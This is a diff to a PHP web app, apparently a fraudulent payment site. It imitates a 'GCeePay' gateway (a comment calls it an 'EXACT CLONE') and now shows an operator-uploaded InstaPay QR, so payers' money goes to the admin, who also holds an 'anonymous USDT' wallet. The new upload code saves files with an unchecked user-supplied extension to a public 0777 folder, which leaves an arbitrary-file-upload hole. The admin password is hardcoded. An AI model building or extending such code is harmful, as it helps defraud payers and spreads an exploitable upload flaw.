@@ -3,6 +3,7 @@ session_start();
 
 $adminSecretPassword = 'admin123'; 
 $dataFile = __DIR__ . '/../data/system_data.json';
+$uploadDir = __DIR__ . '/../public/uploads/';
 
 function loadData($filePath) {
     $dir = dirname($filePath);
@@ -32,6 +33,7 @@ function saveData($filePath, $data) {
 
 $db = loadData($dataFile);
 $adminUsdtWallet = $db['settings']['admin_wallet'] ?? 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd';
+$adminQrImageUrl = $db['settings']['qr_image_url'] ?? '';
 
 if (isset($_GET['ref'])) {
     $_SESSION['referred_by'] = htmlspecialchars($_GET['ref']);
@@ -108,15 +110,27 @@ if (isset($_GET['action']) && $_GET['action'] === 'admin_logout') {
     exit();
 }
 
-// ADMIN SETTINGS UPDATE
+// ADMIN SETTINGS & QR UPLOAD UPDATE
 if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'update_admin_settings') {
     $newWallet = trim($_POST['new_admin_wallet'] ?? '');
     if (!empty($newWallet)) {
         $db['settings']['admin_wallet'] = htmlspecialchars($newWallet);
         $adminUsdtWallet = $newWallet;
     }
+
+    if (isset($_FILES['qr_image']) && $_FILES['qr_image']['error'] === UPLOAD_ERR_OK) {
+        if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); }
+        $ext = pathinfo($_FILES['qr_image']['name'], PATHINFO_EXTENSION);
+        $filename = 'admin_qr_' . time() . '.' . $ext;
+        $targetPath = $uploadDir . $filename;
+        if (move_uploaded_file($_FILES['qr_image']['tmp_name'], $targetPath)) {
+            $db['settings']['qr_image_url'] = '/uploads/' . $filename;
+            $adminQrImageUrl = '/uploads/' . $filename;
+        }
+    }
+
     saveData($dataFile, $db);
-    $adminSuccess = "Matagumpay na na-update ang Admin Wallet!";
+    $adminSuccess = "Matagumpay na na-update ang Admin Settings at QR Code!";
 }
 
 // ADMIN DIRECT FUND ADJUSTMENT
@@ -393,11 +407,18 @@ if ($currentUser && isset($db['transactions'])) {
             </div>
 
             <div class="card">
-                <h3>Admin Wallet Settings</h3>
-                <form method="POST">
+                <h3>Admin Wallet & QR Code Settings</h3>
+                <form method="POST" enctype="multipart/form-data">
                     <input type="hidden" name="action" value="update_admin_settings">
                     <label>Anonymous USDT Wallet Address:</label>
                     <input type="text" name="new_admin_wallet" value="<?= htmlspecialchars($adminUsdtWallet) ?>" required>
+                    
+                    <label style="margin-top: 10px; display:block;">Mag-upload ng InstaPay QR Code (Image):</label>
+                    <?php if (!empty($adminQrImageUrl)): ?>
+                        <div style="margin: 8px 0;"><img src="<?= htmlspecialchars($adminQrImageUrl) ?>" alt="Current QR" style="width: 100px; border-radius: 6px; border: 1px solid #165b41;"></div>
+                    <?php endif; ?>
+                    <input type="file" name="qr_image" accept="image/*" style="background:none; border:none; padding:5px 0;">
+
                     <button type="submit" class="btn" style="margin-top:10px;">I-save Settings</button>
                 </form>
             </div>
@@ -427,7 +448,7 @@ if ($currentUser && isset($db['transactions'])) {
         <?php endif; ?>
 
     <?php elseif (isset($_GET['route']) && $_GET['route'] === 'gateway'): ?>
-        <!-- CLOUD GCEEPAY GATEWAY (CLEAN & EXACT CLONE) -->
+        <!-- CLOUD GCEEPAY GATEWAY (CUSTOM INSTAPAY QR) -->
         <?php 
             $gatewayAmt = $_GET['amount'] ?? 300;
             $gatewayMethod = $_GET['method'] ?? 'GCash';
@@ -444,23 +465,17 @@ if ($currentUser && isset($db['transactions'])) {
 
             <div style="max-width: 440px; margin: 20px auto; background: #ffffff; border-radius: 12px; padding: 25px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05);">
                 <p style="text-align: center; color: #64748b; font-size: 13px; margin-bottom: 20px; font-weight: 500;">
-                    Securely complete the payment with your <?= htmlspecialchars($gatewayMethod) ?> App
+                    Scan or upload this QR code using your <?= htmlspecialchars($gatewayMethod) ?> App
                 </p>
 
-                <!-- OPEN IN APP / INTENT REDIRECT BUTTON -->
-                <button type="button" onclick="launchApp('<?= htmlspecialchars($gatewayMethod) ?>')" style="display: block; width: 100%; background: #1b6ef3; color: #fff; text-align: center; padding: 16px; border-radius: 30px; font-weight: bold; font-size: 15px; border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(27,110,243,0.3); margin-bottom: 25px;">
-                    Open in <?= htmlspecialchars($gatewayMethod) ?>
-                </button>
-
-                <div style="text-align: center; color: #64748b; font-size: 12px; margin-bottom: 25px; position: relative;">
-                    <span style="background: #fff; padding: 0 10px; position: relative; z-index: 1;">or Login to <?= htmlspecialchars($gatewayMethod) ?> and scan this QR with the QR Scanner</span>
-                    <hr style="border: none; border-top: 1px solid #e2e8f0; margin-top: -8px;">
-                </div>
-
-                <!-- QR CODE BOX -->
+                <!-- QR CODE BOX (CUSTOM ADMIN QR IMAGE) -->
                 <div style="text-align: center; margin-bottom: 25px;">
                     <div style="background: #fff; padding: 12px; display: inline-block; border-radius: 12px; border: 1px solid #e2e8f0; box-shadow: 0 2px 8px rgba(0,0,0,0.05);">
-                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=<?= urlencode('https://cloud.gceepay.com/pay?amount='.$gatewayAmt.'&txn='.$txnId) ?>" alt="Payment QR" style="display: block; border-radius: 6px;">
+                        <?php if (!empty($adminQrImageUrl)): ?>
+                            <img src="<?= htmlspecialchars($adminQrImageUrl) ?>" alt="InstaPay Payment QR" style="display: block; width: 220px; height: 220px; border-radius: 6px; object-fit: contain;">
+                        <?php else: ?>
+                            <p style="color: #ef4444; font-size: 12px; padding: 40px;">Walang naka-upload na QR code ang Admin.</p>
+                        <?php endif; ?>
                     </div>
                 </div>
 
@@ -493,27 +508,6 @@ if ($currentUser && isset($db['transactions'])) {
         </div>
 
         <script>
-            function launchApp(method) {
-                var isAndroid = /Android/i.test(navigator.userAgent);
-                var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-                if (method === 'GCash') {
-                    if (isAndroid) {
-                        window.location.href = "intent://#Intent;scheme=gcash;package=com.globe.gcash.android;end;";
-                    } else if (isIOS) {
-                        window.location.href = "gcash://app";
-                    } else {
-                        window.location.href = "gcash://app";
-                    }
-                } else {
-                    if (isAndroid) {
-                        window.location.href = "intent://#Intent;scheme=paymaya;package=com.paymaya;end;";
-                    } else {
-                        window.location.href = "paymaya://";
-                    }
-                }
-            }
-
             var timeLeft = 15 * 60; 
             var timerElement = document.getElementById('timerCountdown');
             var interval = setInterval(function() {
